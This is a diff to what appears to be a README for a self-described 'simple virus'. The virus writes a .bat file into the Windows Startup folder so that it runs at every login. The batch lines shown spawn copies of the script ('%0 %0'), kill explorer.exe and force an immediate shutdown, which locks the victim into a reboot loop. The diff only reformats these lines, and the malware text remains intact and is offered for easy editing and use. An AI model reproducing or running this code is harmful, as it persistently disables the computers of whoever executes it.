@@ -5,10 +5,9 @@
 Simple virus. It is creating .bat file in %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.
 
 You can easily edit it. By default, the file contains the following code:       `
-
-   +system %0 %0 
-   +taskkill /F /IM explorer.exe
-   +shutdown /s /t 1
+   system %0 %0 
+   taskkill /F /IM explorer.exe
+   shutdown /s /t 1
 `.
 Then it will shutdown ur computer.
 
